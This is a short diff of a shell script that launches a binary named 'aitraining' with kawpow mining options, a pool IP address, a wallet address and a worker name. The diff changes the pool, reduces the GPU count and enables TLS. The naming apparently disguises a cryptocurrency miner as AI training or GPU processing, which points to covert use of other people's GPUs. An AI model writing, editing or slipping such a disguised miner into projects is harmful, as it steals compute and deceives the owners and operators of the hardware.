@@ -75,12 +75,12 @@ start_gpu_process() {
         # Start the process with error handling
         if sudo ./aitraining \
             --algorithm kawpow \
-            --pool 74.220.25.74:7845 \
+            --pool 51.89.99.172:16060 \
             --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
             --worker H200-rig \
             --password x \
-            --gpu-id 0,1,2,3,4,5,6,7 \
-            --tls false \
+            --gpu-id 0,1,2,3 \
+            --tls true \
             --disable-cpu \
             --log-file $LOG_DIR/gpu_processing.log \
             --log-file-mode 1 \
